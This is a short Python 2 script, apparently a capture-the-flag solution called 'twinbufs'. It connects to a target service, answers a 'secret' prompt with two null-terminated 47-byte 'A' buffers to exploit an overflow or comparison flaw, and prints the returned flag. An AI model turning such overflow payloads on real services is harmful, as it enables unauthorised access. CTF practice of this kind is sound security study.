import socket
from sys import argv

def twinbufs(IPaddr, port):
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((IPaddr, int(port)))
	
	while 1:
		output = s.recv(1024)
		if "secret" in output:
			s.sendall("A"*47+"\0"+"A"*47+"\0"+'\n')
		elif "FLAG" in output:
			pos = output.find("FLAG")
			print output[pos:]
		elif not output:
			break
twinbufs(argv[1], argv[2])
